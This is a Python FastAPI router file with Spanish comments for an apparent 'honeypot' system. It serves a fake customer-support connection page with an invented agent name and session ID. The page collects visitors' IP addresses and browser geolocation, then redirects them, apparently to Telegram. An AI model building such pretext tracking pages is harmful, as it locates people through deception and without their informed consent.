from fastapi import APIRouter, Request, Depends, HTTPException, Response
from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
from sqlalchemy.orm import Session
from typing import Dict, Any, Optional
import logging
import json

from app.db.session import get_db
from app.db.models import HoneypotRecord
from app.security import honeypot

router = APIRouter()
logger = logging.getLogger(__name__)

# Plantilla HTML para la página de verificación
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Conectando con Soporte al Cliente</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f1f1f1;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            color: #333;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            width: 90%;
            text-align: center;
        }
        h1 {
            color: #075e54;
            margin-top: 0;
        }
        .loading {
            margin: 20px auto;
            display: block;
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #075e54;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p {
            line-height: 1.6;
            color: #333;
        }
        .logo {
            max-width: 120px;
            margin-bottom: 20px;
        }
        #countdown {
            font-weight: bold;
            color: #075e54;
        }
        .agent-info {
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 20px 0;
            padding: 15px;
            background-color: #f9f9f9;
            border-radius: 8px;
        }
        .agent-avatar {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            background-color: #075e54;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 15px;
            color: white;
            font-size: 24px;
            font-weight: bold;
        }
        .agent-details {
            text-align: left;
        }
        .agent-name {
            font-weight: bold;
            margin-bottom: 5px;
        }
        .agent-status {
            color: #4CAF50;
            font-size: 14px;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            border-top: 1px solid #eee;
            padding: 10px 0;
            font-size: 14px;
        }
        .info-label {
            color: #666;
        }
        .info-value {
            font-weight: 500;
        }
    </style>
</head>
<body>
    <div class="container">
        <img src="/static/images/logo.png" alt="Logo" class="logo" onerror="this.style.display='none'">
        <h1>Conectando con Soporte al Cliente</h1>
        
        <div class="agent-info">
            <div class="agent-avatar">C</div>
            <div class="agent-details">
                <div class="agent-name">Carlos Mendoza</div>
                <div class="agent-status">Preparando sesión segura...</div>
            </div>
        </div>
        
        <p>Estamos conectando con nuestro representante de soporte en una sesión segura. Por favor, espere un momento mientras se establece la conexión.</p>
        
        <div class="loading"></div>
        
        <div class="info-row">
            <span class="info-label">ID de Sesión:</span>
            <span class="info-value">{session_id}</span>
        </div>
        <div class="info-row">
            <span class="info-label">Tiempo estimado:</span>
            <span class="info-value"><span id="countdown">5</span> segundos</span>
        </div>
        
        <p style="margin-top: 20px; font-size: 14px; color: #666;">
            Nuestro representante podrá ayudarle con cualquier consulta o problema relacionado con su cuenta.
        </p>
    </div>

    <script>
        // Intenta obtener la ubicación del usuario si está disponible
        let locationData = {};
        
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                position => {
                    locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    
                    // Enviar los datos al servidor
                    fetch('/api/security/record-location?id={tracking_id}', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(locationData)
                    }).catch(e => console.error('Error enviando ubicación:', e));
                },
                error => {
                    console.log('Error obteniendo ubicación:', error.message);
                }
            );
        }
        
        // Cuenta regresiva y redirección
        let count = 5;
        const countdownElement = document.getElementById('countdown');
        
        const countdown = setInterval(() => {
            count--;
            countdownElement.textContent = count;
            
            if (count <= 0) {
                clearInterval(countdown);
                window.location.href = '{redirect_url}';
            }
        }, 1000);
    </script>
</body>
</html>
"""

@router.get("/verification", response_class=HTMLResponse)
async def verification_page(request: Request, id: str):
    """
    Página de verificación que captura información del usuario y redirige a Telegram
    """
    # Registrar la visita
    logger.info(f"Visita a verificación: {id} desde {request.client.host}")
    
    # Obtener el registro de honeypot
    record = honeypot.get_honeypot_record(id)
    if not record:
        logger.warning(f"Intento de acceso a un ID de honeypot no válido: {id}")
        # Redirigir a una página genérica para no levantar sospechas
        return RedirectResponse(url="/")
    
    # Registrar el clic
    honeypot.record_honeypot_click(id, request)
    
    # Reemplazar marcadores de posición en la plantilla HTML
    html_content = HTML_TEMPLATE.replace('{tracking_id}', id)
    html_content = html_content.replace('{redirect_url}', record.get('redirect_url', honeypot.REDIRECT_URL))
    
    # Generar un ID de sesión aleatorio para que parezca legítimo
    import random
    session_id = f"SUP-{random.randint(100000, 999999)}"
    html_content = html_content.replace('{session_id}', session_id)
    
    return HTMLResponse(content=html_content)

@router.post("/record-location")
async def record_location(request: Request, id: str, location_data: Dict[str, Any]):
    """
    Endpoint para registrar la ubicación del usuario
    """
    # Obtener el registro de honeypot
    record = honeypot.get_honeypot_record(id)
    if not record:
        return JSONResponse(status_code=404, content={"status": "error", "message": "ID no válido"})
    
    # Actualizar el registro con los datos de ubicación
    # En una implementación real, esto se guardaría en la base de datos
    record["location_data"] = location_data
    
    logger.info(f"Ubicación registrada para {id}: {location_data}")
    return {"status": "success"}

@router.get("/honeypot-stats", response_model=Dict[str, Any])
async def honeypot_statistics(request: Request, db: Session = Depends(get_db)):
    """
    Obtiene estadísticas sobre los honeypots desplegados
    """
    stats = honeypot.get_honeypot_statistics()
    
    # En una implementación real, obtendríamos los datos de la base de datos
    # Por ahora, usamos los datos en memoria
    
    return {
        "statistics": stats,
        "latest_records": list(honeypot.honeypot_records.values())[:10]  # Últimos 10 registros
    }

@router.get("/honeypot/{tracking_id}", response_model=Dict[str, Any])
async def get_honeypot_detail(tracking_id: str, db: Session = Depends(get_db)):
    """
    Obtiene detalles de un registro específico de honeypot
    """
    record = honeypot.get_honeypot_record(tracking_id)
    if not record:
        raise HTTPException(status_code=404, detail="Registro no encontrado")
    
    return {
        "record": record
    }